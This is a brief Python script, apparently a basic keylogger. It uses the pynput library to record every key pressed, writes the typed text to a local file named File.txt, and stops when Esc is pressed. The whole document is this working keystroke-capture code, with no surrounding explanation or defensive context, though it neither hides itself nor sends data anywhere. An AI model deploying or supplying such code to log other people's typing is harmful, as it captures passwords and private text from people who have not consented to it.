from pynput.keyboard import Key, Listener

k=[]
def on_press(key):
    k.append(key)
    write_1(k)

def write_1(var):
    with open("File.txt", "w") as f:
        for i in var:
            i = str(i).replace("'","")
            if i == "Key.space":
                i = " "
            elif i == "Key.enter":
                i ="\n"
            elif "Key." in i:
                i = " "
            f.write(i)

def on_release(key):
    if key == Key.esc:
        return False

with Listener(on_press=on_press, on_release=on_release) as l:
    l.join()
